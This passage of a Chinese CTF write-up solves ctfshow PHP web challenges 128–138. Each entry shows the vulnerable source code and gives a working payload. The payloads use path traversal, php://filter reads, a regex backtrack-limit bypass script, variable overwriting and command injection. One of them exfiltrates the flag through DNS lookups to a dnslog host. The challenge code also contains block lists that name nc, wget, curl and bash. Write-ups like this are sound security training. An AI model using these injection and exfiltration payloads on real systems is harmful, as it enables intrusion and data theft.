constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现对f1进行了过滤，不能使用数字和字母，然后需要知道这里可以使用gettext扩展，开启此扩展后，_() 就等效于 gettext()。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">gettext</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出结果：123</span><span class="token keyword">echo</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出结果：123</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>call_user_func函数：第一个参数是被调用的回调函数，其余参数是回调函数的参数。<br>则payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>f1<span class="token operator">=</span><span class="token constant">_</span><span class="token operator">&amp;</span>f2<span class="token operator">=</span>get_defined_vars<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag：ctfshow{6b91dc55-68e5-4d44-9d44-bf3dca83426d}</p><h4 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>stripos：(PHP 5, PHP 7)stripos — 查找字符串首次出现的位置（不区分大小写），返回该字符串首次出现的数字位置。<br>readflie:输出文件,读取文件并写入到输出缓冲。 返回从文件中读入的字节数。如果出错返回    <code>FALSE</code> 并且除非是以    @<strong>readfile()</strong> 形式调用，否则会显示错误信息。  </p><p>第一种直接文件包含：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>f<span class="token operator">=</span><span class="token operator">/</span>ctfshow<span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二种伪协议读取：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题再次涉及到了一个新的知识点：PRCE最大回溯次数。</p><ul><li>PHP中，为了防止一次正则匹配调用的匹配过程过大从而造成过多的资源消耗，限定了一次正则匹配中调用匹配函数的次数。 回溯主要有两种</li></ul><ol><li><strong>贪婪模式</strong>下，字符串部分被匹配，但是后半部分没匹配（匹配“用力过猛”，把后面的部分也匹配过了）时匹配式回退的操作，在出现*、+时容易产生。</li><li><strong>非贪婪模式</strong>下，字符串部分被匹配，但后半部分没匹配完全（匹配“用力不够”，需要通配符再匹配一定的长度），在出现*?、+?时容易产生。</li></ol><ul><li>当传入字符串在正则匹配时回溯次数超过限制（默认1000000，可调整）时，会报错返回false<br>再看到题目有说到省略25万个very，所以脚本为：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://ebe6b9d4-02ef-42be-98fc-e5dfa2d1b23e.challenge.ctf.show/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'ctfshow'</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_130.png"></p><p>或者直接：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">postf<span class="token operator">=</span>ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $f <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_POST<span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> $f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>stripos<span class="token punctuation">(</span>$f<span class="token punctuation">,</span><span class="token string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> FALSE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    echo $flag<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题和上一题一样，只需要改下脚本即可：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://202b9930-2598-4766-801c-940a048c0f4b.challenge.ctf.show/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'36Dctfshow'</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag：</p><p><img src="/images/web_131.png"></p><h4 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h4><p>打开可以先看到一个英文页面</p><p><img src="/images/web_132a.png"></p><p>然后查看robots.txt文件，发现有admin路径</p><p><img src="/images/web_132B.png"></p><p>来到admin路径</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php<span class="token comment">#error_reporting(0);</span>include<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $username <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $password <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $code <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$code <span class="token operator">==</span><span class="token operator">=</span> mt_rand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> $password <span class="token operator">==</span><span class="token operator">=</span> $flag <span class="token operator">|</span><span class="token operator">|</span> $username <span class="token operator">==</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>$code <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            echo $flag<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为&amp;&amp;的优先级高于||，所以只需要构造出$username===”admin”和下一个条件$code==’admin’即可<br>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?code<span class="token operator">=</span>admin<span class="token operator">&amp;</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">//</span>flag<span class="token punctuation">.</span>php<span class="token keyword">if</span><span class="token punctuation">(</span>$F <span class="token operator">=</span> @$_GET<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> $F<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token builtin">eval</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span>$F<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"6个字母都还不够呀?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看了群主的视频，才知道了该题的姿势，首先在dnslog获取一个免费的域名，然后使用ping命令和grep命令，将回显带到dnslog网站中，同时利用$F变量，payload如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?F<span class="token operator">=</span>`$F`<span class="token punctuation">;</span> ping `cat flag<span class="token punctuation">.</span>php <span class="token operator">|</span> grep ctfshow`<span class="token punctuation">.</span>abwso0<span class="token punctuation">.</span>dnslog<span class="token punctuation">.</span>cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag：<br><img src="/images/web_133.png"></p><h4 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>$key1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>$key2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@parse_str</span><span class="token punctuation">(</span>$_SERVER<span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>extract<span class="token punctuation">(</span>$_POST<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$key1 <span class="token operator">==</span> <span class="token string">'36d'</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> $key2 <span class="token operator">==</span> <span class="token string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span>file_get_contents<span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到parse_str函数和extract函数，这题大概就算变量覆盖函数了，同时又看到了$_SERVER[‘QUERY_STRING’]变量，由之前的几题可以知道会讲url中的参数注册为变量，所有payload为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?_POST<span class="token punctuation">[</span>key1<span class="token punctuation">]</span><span class="token operator">=</span>36d<span class="token operator">&amp;</span>_POST<span class="token punctuation">[</span>key2<span class="token punctuation">]</span><span class="token operator">=</span>36d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再右键查看源代码就可以看到flag了</p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">//</span>flag<span class="token punctuation">.</span>php<span class="token keyword">if</span><span class="token punctuation">(</span>$F <span class="token operator">=</span> @$_GET<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> $F<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token builtin">eval</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span>$F<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"师傅们居然破解了前面的，那就来一个加强版吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题在133题的基础上过滤了更多的命令，但发现可以使用cp命令，将flag.php复制到我们可以访问的文件，payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?F<span class="token operator">=</span>`$F`<span class="token punctuation">;</span> cp flag<span class="token punctuation">.</span>php <span class="token number">1</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>function check<span class="token punctuation">(</span>$x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> $x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $c<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    check<span class="token punctuation">(</span>$c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span>$c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这题过滤了大量的函数，看了其他师傅们的博客，才知道Linux中还有一个tee命令。<br>Tee是    <a href="https://baike.baidu.com/item/Linux%E5%91%BD%E4%BB%A4/1750369">Linux命令</a>    ，用于显示程序的输出并将其复制到一个文件中。</p><p>ls |tee xxx  即将ls命令的结果输出到xxx中，所以payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?c<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span>tee jian<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先查看根目录<br><img src="/images/web_136.png"></p><p>发现一个特殊的目录，再次读取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?c<span class="token operator">=</span>nl <span class="token operator">/</span>f149_15_h3r3<span class="token operator">|</span>tee jian<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">&#123;</span>    function __wakeup<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    static function getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>call_user_func<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题考察的是类的调用，payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">postctfshow<span class="token operator">=</span>ctfshow<span class="token punctuation">:</span><span class="token punctuation">:</span>getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看源代码，直接拿到flag</p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">&#123;</span>    function __wakeup<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    static function getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>strripos<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token 